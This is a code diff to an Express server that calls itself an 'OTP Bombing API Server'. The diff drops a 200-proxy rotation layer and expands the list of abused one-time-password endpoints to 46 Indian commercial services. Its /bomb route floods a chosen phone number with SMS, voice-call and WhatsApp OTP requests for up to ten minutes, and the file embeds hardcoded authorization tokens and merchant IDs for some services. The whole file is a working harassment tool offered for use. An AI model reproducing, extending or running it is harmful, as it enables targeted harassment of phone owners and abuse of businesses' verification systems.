@@ -1,13 +1,11 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (FINAL + PROXY)
-// 16 Working APIs | Proxy Rotation | 10min Cap | Logs | Delay
+// api_server.js - OTP Bombing API Server (46 APIs)
+// 16 Working + 30 New APIs | 10min Cap | Logs | Delay
 // ============================================================
 
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const { HttpsProxyAgent } = require('https-proxy-agent');
-const { HttpProxyAgent } = require('http-proxy-agent');
 
 const app = express();
 app.use(cors());
@@ -18,285 +16,15 @@ app.use(express.urlencoded({ extended: true }));
 const MAX_DURATION_MIN = 10;
 const BATCH_DELAY_MS = 100;
 const API_DELAY_MS = 50;
-const PROXY_TIMEOUT = 8000;
 
 // ============================================================
-// 🌐 PROXY LIST — 200 PROXIES
-// ============================================================
-
-const PROXY_LIST = [
-    "1.0.136.129:8080",
-    "1.0.170.50:8080",
-    "1.1.109.141:9999",
-    "1.1.189.58:8080",
-    "1.1.220.100:8080",
-    "1.10.141.115:8080",
-    "1.10.146.76:3128",
-    "1.117.83.95:80",
-    "1.179.147.5:52210",
-    "1.179.148.33:1080",
-    "1.179.148.9:36476",
-    "1.179.148.9:55636",
-    "1.179.172.45:31225",
-    "1.179.199.130:33333",
-    "1.179.231.130:8080",
-    "1.180.0.162:7302",
-    "1.180.49.222:7302",
-    "1.2.252.65:8080",
-    "1.20.169.102:8080",
-    "1.212.157.114:4145",
-    "1.234.153.14:80",
-    "1.4.198.167:8080",
-    "1.52.198.150:16000",
-    "1.52.198.221:16000",
-    "1.54.172.229:16000",
-    "1.9.167.35:60489",
-    "100.1.53.24:5678",
-    "100.27.183.62:8080",
-    "101.108.112.243:8080",
-    "101.108.113.83:8080",
-    "101.109.107.206:8080",
-    "101.109.119.24:8080",
-    "101.109.217.20:8080",
-    "101.109.245.200:4153",
-    "101.109.76.109:4145",
-    "101.128.107.36:1111",
-    "101.128.93.144:8090",
-    "101.2.161.118:8080",
-    "101.200.241.24:3128",
-    "101.251.204.174:8080",
-    "101.255.106.94:8080",
-    "101.255.107.118:8080",
-    "101.255.119.206:8080",
-    "101.255.119.26:8080",
-    "101.255.137.49:80",
-    "101.255.138.82:80",
-    "101.255.148.2:8080",
-    "101.255.150.238:1080",
-    "101.255.158.78:1111",
-    "101.255.166.134:1111",
-    "101.255.208.18:8090",
-    "101.255.208.62:8080",
-    "101.255.210.1:1111",
-    "101.255.210.1:11116",
-    "101.255.211.42:1111",
-    "101.255.211.54:8082",
-    "101.255.32.42:8080",
-    "101.255.53.105:8080",
-    "101.255.69.26:8080",
-    "101.32.34.4:8118",
-    "101.47.16.15:7890",
-    "101.51.121.29:4153",
-    "101.51.138.138:8080",
-    "101.91.242.198:6688",
-    "102.0.0.118:80",
-    "102.0.16.226:8080",
-    "102.0.17.164:8080",
-    "102.0.18.120:8080",
-    "102.0.18.198:8080",
-    "102.0.21.156:8080",
-    "102.0.8.23:8080",
-    "102.0.9.114:8080",
-    "102.135.142.234:12354",
-    "102.135.195.90:8082",
-    "102.141.30.2:33333",
-    "102.164.215.88:8080",
-    "102.164.220.243:8080",
-    "102.164.252.150:8080",
-    "102.165.125.102:5678",
-    "102.177.176.0:80",
-    "102.177.176.100:80",
-    "102.177.176.101:80",
-    "102.177.176.102:80",
-    "102.177.176.103:80",
-    "102.177.176.104:80",
-    "102.177.176.105:80",
-    "102.177.176.106:80",
-    "102.177.176.107:80",
-    "102.177.176.108:80",
-    "102.177.176.109:80",
-    "102.177.176.10:80",
-    "102.177.176.110:80",
-    "102.177.176.111:80",
-    "102.177.176.112:80",
-    "102.177.176.113:80",
-    "102.177.176.114:80",
-    "102.177.176.115:80",
-    "102.177.176.116:80",
-    "102.177.176.117:80",
-    "102.177.176.118:80",
-    "102.177.176.119:80",
-    "102.177.176.11:80",
-    "102.177.176.120:80",
-    "102.177.176.121:80",
-    "102.177.176.122:80",
-    "102.177.176.123:80",
-    "102.177.176.124:80",
-    "102.177.176.125:80",
-    "102.177.176.126:80",
-    "102.177.176.127:80",
-    "102.177.176.128:80",
-    "102.177.176.129:80",
-    "102.177.176.12:80",
-    "102.177.176.130:80",
-    "102.177.176.131:80",
-    "102.177.176.132:80",
-    "102.177.176.133:80",
-    "102.177.176.134:80",
-    "102.177.176.135:80",
-    "102.177.176.136:80",
-    "102.177.176.137:80",
-    "102.177.176.138:80",
-    "102.177.176.139:80",
-    "102.177.176.13:80",
-    "102.177.176.140:80",
-    "102.177.176.141:80",
-    "102.177.176.142:80",
-    "102.177.176.143:80",
-    "102.177.176.144:80",
-    "102.177.176.145:80",
-    "102.177.176.146:80",
-    "102.177.176.147:80",
-    "102.177.176.148:80",
-    "102.177.176.149:80",
-    "102.177.176.14:80",
-    "102.177.176.150:80",
-    "102.177.176.151:80",
-    "102.177.176.152:80",
-    "102.177.176.153:80",
-    "102.177.176.154:80",
-    "102.177.176.155:80",
-    "102.177.176.156:80",
-    "102.177.176.157:80",
-    "102.177.176.158:80",
-    "102.177.176.159:80",
-    "102.177.176.15:80",
-    "102.177.176.160:80",
-    "102.177.176.161:80",
-    "102.177.176.162:80",
-    "102.177.176.163:80",
-    "102.177.176.164:80",
-    "102.177.176.165:80",
-    "102.177.176.166:80",
-    "102.177.176.167:80",
-    "102.177.176.168:80",
-    "102.177.176.169:80",
-    "102.177.176.16:80",
-    "102.177.176.170:80",
-    "102.177.176.171:80",
-    "102.177.176.172:80",
-    "102.177.176.173:80",
-    "102.177.176.174:80",
-    "102.177.176.175:80",
-    "102.177.176.176:80",
-    "102.177.176.177:80",
-    "102.177.176.178:80",
-    "102.177.176.179:80",
-    "102.177.176.17:80",
-    "102.177.176.180:80",
-    "102.177.176.181:80",
-    "102.177.176.182:80",
-    "102.177.176.183:80",
-    "102.177.176.184:80",
-    "102.177.176.185:80",
-    "102.177.176.186:80",
-    "102.177.176.187:80",
-    "102.177.176.188:80",
-    "102.177.176.189:80",
-    "102.177.176.18:80",
-    "102.177.176.190:80",
-    "102.177.176.191:80",
-    "102.177.176.192:80",
-    "102.177.176.193:80",
-    "102.177.176.194:80",
-    "102.177.176.195:80",
-    "102.177.176.196:80",
-    "102.177.176.197:80",
-    "102.177.176.198:80",
-    "102.177.176.199:80",
-    "102.177.176.19:80",
-    "102.177.176.1:80",
-    "102.177.176.200:80",
-    "102.177.176.201:80",
-    "102.177.176.202:80",
-    "102.177.176.203:80",
-    "102.177.176.204:80",
-    "102.177.176.205:80",
-    "102.177.176.206:80",
-    "102.177.176.207:80"
-];
-
-// ============================================================
-// 🔄 PROXY ROTATION STATE
-// ============================================================
-
-let _proxyIdx = 0;
-const _deadProxies = new Set();
-const _proxyStats = {
-    totalAttempts: 0,
-    successCount: 0,
-    failCount: 0,
-    deadCount: 0
-};
-
-/**
- * Round-robin proxy selector with dead proxy skip
- */
-function getNextProxy() {
-    if (PROXY_LIST.length === 0) return null;
-    
-    let tried = 0;
-    while (tried < PROXY_LIST.length) {
-        const proxyStr = PROXY_LIST[_proxyIdx % PROXY_LIST.length];
-        _proxyIdx++;
-        tried++;
-        
-        if (!_deadProxies.has(proxyStr)) {
-            return proxyStr;
-        }
-    }
-    return null; // All proxies dead
-}
-
-/**
- * Mark proxy as dead (auto-blacklist)
- */
-function markProxyDead(proxyStr) {
-    if (proxyStr && !_deadProxies.has(proxyStr)) {
-        _deadProxies.add(proxyStr);
-        _proxyStats.deadCount = _deadProxies.size;
-        console.log(`💀 Proxy marked DEAD: ${proxyStr} (Total dead: ${_deadProxies.size}/${PROXY_LIST.length})`);
-    }
-}
-
-/**
- * Get axios proxy config
- */
-function getProxyConfig(proxyStr) {
-    if (!proxyStr) return {};
-    
-    try {
-        const proxyUrl = `http://${proxyStr}`;
-        return {
-            httpAgent: new HttpProxyAgent(proxyUrl),
-            httpsAgent: new HttpsProxyAgent(proxyUrl),
-            proxy: false // Disable axios default proxy handling (agents handle it)
-        };
-    } catch (e) {
-        return {};
-    }
-}
-
-console.log(`🌐 Loaded ${PROXY_LIST.length} proxies`);
-console.log(`🔄 Proxy rotation: ENABLED (round-robin)`);
-console.log(`💀 Auto-blacklist dead proxies: ENABLED`);
-
-// ============================================================
-// ===== 16 WORKING APIs =====
+// ===== ALL APIS (16 Working + 30 New) =====
 // ============================================================
 
 const APIS = [
-    // ===== 🟢 TIER 1 — RELIABLE (6 APIs) =====
+    // ============================================================
+    // 🟢 TIER 1 — RELIABLE (6 APIs)
+    // ============================================================
     {
         name: "GetInstaCash",
         method: "POST",
@@ -376,7 +104,9 @@ const APIS = [
         data: { "_raw": "user={phone}&v3=true" }
     },
 
-    // ===== 🟡 TIER 2 — PURANI WORKING (5 APIs) =====
+    // ============================================================
+    // 🟡 TIER 2 — PURANI WORKING (5 APIs)
+    // ============================================================
     {
         name: "Tata Capital Voice",
         url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
@@ -448,7 +178,9 @@ const APIS = [
         }
     },
 
-    // ===== 🟢 TIER 3 — NAYI WORKING (5 APIs) =====
+    // ============================================================
+    // 🟢 TIER 3 — NAYI WORKING (5 APIs)
+    // ============================================================
     {
         name: "Vedantu",
         method: "POST",
@@ -500,15 +232,302 @@ const APIS = [
         method: "POST",
         headers: { "Content-Type": "application/json" },
         data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
+    },
+
+    // ============================================================
+    // 🆕 30 NAYI APIs
+    // ============================================================
+    {
+        name: "Delhivery",
+        method: "GET",
+        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
+        headers: {
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
+            "accept": "*/*"
+        }
+    },
+    {
+        name: "ConfirmTkt",
+        method: "GET",
+        url: "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone}",
+        headers: {
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
+            "accept": "*/*"
+        }
+    },
+    {
+        name: "PharmEasy_NEW",
+        method: "POST",
+        url: "https://pharmeasy.in/api/auth/requestOTP",
+        headers: {
+            "Host": "pharmeasy.in",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
+            "Accept": "*/*",
+            "Content-Type": "application/json"
+        },
+        data: { "contactNumber": "{phone}" }
+    },
+    {
+        name: "HeroMotoCorp",
+        method: "POST",
+        url: "https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php",
+        headers: {
+            "Host": "www.heromotocorp.com",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
+        data: { "_raw": "mobile_no={phone}&randome=ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=" }
+    },
+    {
+        name: "IndiaLends",
+        method: "POST",
+        url: "https://indialends.com/internal/a/mobile-verification_v2.ashx",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
+        data: { "_raw": "aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={phone}&lj80gertdfg=0" }
+    },
+    {
+        name: "Flipkart_Signup",
+        method: "POST",
+        url: "https://www.flipkart.com/api/6/user/signup/status",
+        headers: {
+            "Content-Type": "application/json; charset=utf-8"
+        },
+        data: (phone) => JSON.stringify({ loginId: [`+91${phone}`], supportAllStates: true })
+    },
+    {
+        name: "Flipkart_OTP",
+        method: "POST",
+        url: "https://www.flipkart.com/api/5/user/otp/generate",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "loginId=%2B91{phone}&state=VERIFIED&churnEmailRequest=false" }
+    },
+    {
+        name: "Lenskart_refr",
+        method: "POST",
+        url: "https://www.ref-r.com/clients/lenskart/smsApi",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "mobile={phone}&submit=1" }
+    },
+    {
+        name: "Practo",
+        method: "POST",
+        url: "https://accounts.practo.com/send_otp",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "client_name=Practo+Android+App&mobile=%2B91{phone}" }
+    },
+    {
+        name: "PizzaHut_NEW",
+        method: "POST",
+        url: "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        data: (phone) => JSON.stringify({ customer: { MobileNo: phone, UserName: phone, merchantId: "98d18d82-ba59-4957-9c92-3f89207a34f6" } })
+    },
+    {
+        name: "Goibibo",
+        method: "POST",
+        url: "https://www.goibibo.com/common/downloadsms/",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "mbl={phone}" }
+    },
+    {
+        name: "ApolloPharmacy",
+        method: "POST",
+        url: "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "mobile={phone}" }
+    },
+    {
+        name: "Ajio_NEW",
+        method: "POST",
+        url: "https://www.ajio.com/api/auth/signupSendOTP",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        data: (phone) => JSON.stringify({ firstName: "User", login: "user@gmail.com", password: "Pass@123", mobileNumber: phone, requestType: "SENDOTP" })
+    },
+    {
+        name: "AltBalaji_NEW",
+        method: "POST",
+        url: "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
+        headers: {
+            "Content-Type": "application/json;charset=UTF-8"
+        },
+        data: (phone) => JSON.stringify({ country_code: "91", phone_number: phone })
+    },
+    {
+        name: "Aala",
+        method: "POST",
+        url: "https://www.aala.com/accustomer/ajax/getOTP",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "email=91{phone}&firstname=User&lastname=User" }
+    },
+    {
+        name: "Grab",
+        method: "POST",
+        url: "https://api.grab.com/grabid/v1/phone/otp",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "method=SMS&countryCode=id&phoneNumber=91{phone}&templateID=pax_android_production" }
+    },
+    {
+        name: "Gokwik_1",
+        method: "POST",
+        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        headers: {
+            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
+            "Content-Type": "application/json",
+            "gk-merchant-id": "19g6im8srkz9y"
+        },
+        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
+    },
+    {
+        name: "Gokwik_2",
+        method: "POST",
+        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        headers: {
+            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
+            "Content-Type": "application/json",
+            "gk-merchant-id": "19an4fq2kk5y"
+        },
+        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
+    },
+    {
+        name: "Breeze",
+        method: "POST",
+        url: "https://api.breeze.in/session/start",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        data: (phone) => JSON.stringify({ phoneNumber: phone, authVerificationType: "otp", countryCode: "+91" })
+    },
+    {
+        name: "Gokwik_3",
+        method: "POST",
+        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        headers: {
+            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
+            "Content-Type": "application/json",
+            "gk-merchant-id": "19g6ilhej3mfc"
+        },
+        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
+    },
+    {
+        name: "Kisan",
+        method: "POST",
+        url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        data: (phone) => JSON.stringify({ mobile_number: phone, client_id: "kisan-app" })
+    },
+    {
+        name: "PenPencil",
+        method: "POST",
+        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        data: (phone) => JSON.stringify({ mobile: phone, organizationId: "5eb393ee95fab7468a79d189" })
+    },
+    {
+        name: "Khatabook",
+        method: "POST",
+        url: "https://api.khatabook.com/v1/auth/request-otp",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        data: (phone) => JSON.stringify({ country_code: "+91", phone: phone, app_signature: "Jc/Zu7qNqQ2" })
+    },
+    {
+        name: "Jockey",
+        method: "GET",
+        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
+        headers: {
+            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
+            "accept": "*/*"
+        }
+    },
+    {
+        name: "Gokwik_4",
+        method: "POST",
+        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+        headers: {
+            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
+            "Content-Type": "application/json",
+            "gk-merchant-id": "19kc37zcdyiu"
+        },
+        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
+    },
+    {
+        name: "Vidyakul",
+        method: "POST",
+        url: "https://vidyakul.com/signup-otp/send",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "phone={phone}&rcsconsent=true" }
+    },
+    {
+        name: "AdityaBirla",
+        method: "POST",
+        url: "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        data: (phone) => JSON.stringify({ request: "CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw==" })
+    },
+    {
+        name: "Pinknblu",
+        method: "POST",
+        url: "https://pinknblu.com/v1/auth/generate/otp",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "_token=fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb&country_code=%2B91&phone={phone}" }
+    },
+    {
+        name: "Udaan",
+        method: "POST",
+        url: "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        data: { "_raw": "mobile={phone}" }
+    },
+    {
+        name: "Nuvama",
+        method: "POST",
+        url: "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        data: (phone) => JSON.stringify({ contactInfo: phone, mode: "SMS" })
     }
 ];
 
-console.log(`✅ Loaded ${APIS.length} working APIs`);
+console.log(`✅ Loaded ${APIS.length} total APIs`);
 console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
 console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);
 
 // ============================================================
-// ===== API CALL FUNCTION (WITH PROXY) =====
+// ===== API CALL FUNCTION =====
 // ============================================================
 
 function makeFallbackData(phone, apiName) {
@@ -524,13 +543,6 @@ function makeFallbackData(phone, apiName) {
 
 async function makeApiCall(api, phone, retryCount = 0) {
     const startTime = Date.now();
-    
-    // 🌐 Get rotating proxy
-    const proxyStr = getNextProxy();
-    const proxyConfig = getProxyConfig(proxyStr);
-    
-    _proxyStats.totalAttempts++;
-    
     try {
         let url = api.url;
         if (typeof url === 'function') url = url(phone);
@@ -580,8 +592,7 @@ async function makeApiCall(api, phone, retryCount = 0) {
             method,
             url,
             headers,
-            timeout: PROXY_TIMEOUT,
-            ...proxyConfig
+            timeout: 5000,
         };
 
         if (method === 'post' || method === 'put') {
@@ -600,49 +611,13 @@ async function makeApiCall(api, phone, retryCount = 0) {
 
         const response = await axios(config);
         const responseTime = Date.now() - startTime;
-        
-        _proxyStats.successCount++;
-        
-        return { 
-            status: response.status, 
-            success: true, 
-            responseTime,
-            proxy: proxyStr
-        };
-        
+        return { status: response.status, success: true, responseTime };
     } catch (err) {
-        const responseTime = Date.now() - startTime;
-        
-        // 🔥 Check if proxy failed
-        const isProxyError = 
-            err.code === 'ECONNREFUSED' ||
-            err.code === 'ECONNRESET' ||
-            err.code === 'ETIMEDOUT' ||
-            err.code === 'ECONNABORTED' ||
-            err.code === 'ENOTFOUND' ||
-            err.message?.includes('proxy') ||
-            err.message?.includes('tunneling') ||
-            err.message?.includes('socket hang up');
-        
-        // Mark proxy dead if it failed multiple times
-        if (isProxyError && proxyStr) {
-            markProxyDead(proxyStr);
-        }
-        
-        _proxyStats.failCount++;
-        
-        // 🔄 Retry with next proxy (max 2 retries)
-        if (retryCount < 2) {
+        if (retryCount < 1 && 
+            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
             return makeApiCall(api, phone, retryCount + 1);
         }
-        
-        return { 
-            status: null, 
-            success: false, 
-            responseTime,
-            proxy: proxyStr,
-            error: err.message
-        };
+        return { status: null, success: false, responseTime: Date.now() - startTime };
     }
 }
 
@@ -657,36 +632,8 @@ app.get('/', (req, res) => {
         apis: APIS.length,
         max_duration_min: MAX_DURATION_MIN,
         api_delay_ms: API_DELAY_MS,
-        proxy_stats: {
-            total_proxies: PROXY_LIST.length,
-            dead_proxies: _deadProxies.size,
-            alive_proxies: PROXY_LIST.length - _deadProxies.size,
-            total_attempts: _proxyStats.totalAttempts,
-            success: _proxyStats.successCount,
-            fail: _proxyStats.failCount
-        },
         uptime: process.uptime()
     });
-});
-
-// 🔥 Proxy stats route
-app.get('/proxy-stats', (req, res) => {
-    res.json({
-        total_proxies: PROXY_LIST.length,
-        dead_proxies: _deadProxies.size,
-        alive_proxies: PROXY_LIST.length - _deadProxies.size,
-        dead_proxy_list: Array.from(_deadProxies),
-        stats: _proxyStats
-    });
-});
-
-// 🔥 Reset dead proxies
-app.post('/reset-proxies', (req, res) => {
-    const count = _deadProxies.size;
-    _deadProxies.clear();
-    _proxyStats.deadCount = 0;
-    console.log(`♻️  Reset ${count} dead proxies`);
-    res.json({ success: true, message: `Reset ${count} dead proxies`, total_alive: PROXY_LIST.length });
 });
 
 app.post('/bomb', async (req, res) => {
@@ -700,7 +647,6 @@ app.post('/bomb', async (req, res) => {
     const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);
 
     console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);
-    console.log(`🌐 Using ${PROXY_LIST.length - _deadProxies.size}/${PROXY_LIST.length} alive proxies`);
 
     try {
         const startTime = Date.now();
@@ -740,7 +686,7 @@ app.post('/bomb', async (req, res) => {
                     const isWhatsapp = apiName.toLowerCase().includes('whatsapp');
                     const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
                     
-                    console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}] via ${result.value.proxy || 'direct'}`);
+                    console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}]`);
                     
                     if (isCall) callCount++;
                     else if (isWhatsapp) whatsappCount++;
@@ -749,7 +695,7 @@ app.post('/bomb', async (req, res) => {
                     const apiName = api.name || '';
                     const status = result.value?.status || 'FAIL';
                     const responseTime = result.value?.responseTime || 0;
-                    console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms) via ${result.value?.proxy || 'direct'}`);
+                    console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms)`);
                 }
             }
             
@@ -760,8 +706,7 @@ app.post('/bomb', async (req, res) => {
 
         const elapsed = (Date.now() - startTime) / 1000;
         
-        console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s`);
-        console.log(`📊 Proxy stats: ${_deadProxies.size} dead / ${PROXY_LIST.length} total\n`);
+        console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s\n`);
         
         res.json({
             success: true,
@@ -774,11 +719,7 @@ app.post('/bomb', async (req, res) => {
             calls: callCount,
             whatsapp: whatsappCount,
             elapsed: elapsed.toFixed(1) + 's',
-            proxy_stats: {
-                total: PROXY_LIST.length,
-                dead: _deadProxies.size,
-                alive: PROXY_LIST.length - _deadProxies.size
-            }
+            total_apis: APIS.length
         });
         
     } catch (error) {
@@ -792,7 +733,6 @@ app.get('/apis', (req, res) => {
         total: APIS.length,
         max_duration_min: MAX_DURATION_MIN,
         api_delay_ms: API_DELAY_MS,
-        total_proxies: PROXY_LIST.length,
         apis: APIS.map(a => a.name),
         instances: process.env.INSTANCE_NAME || 'api'
     });
@@ -802,11 +742,8 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 API Server running on port ${PORT}`);
     console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
-    console.log(`📊 APIs loaded: ${APIS.length}`);
-    console.log(`🌐 Proxies loaded: ${PROXY_LIST.length}`);
+    console.log(`📊 APIs loaded: ${APIS.length} (16 working + 30 new)`);
     console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
     console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
     console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
-    console.log(`🔄 Proxy rotation: ENABLED (round-robin)`);
-    console.log(`💀 Auto-blacklist: ENABLED`);
 });
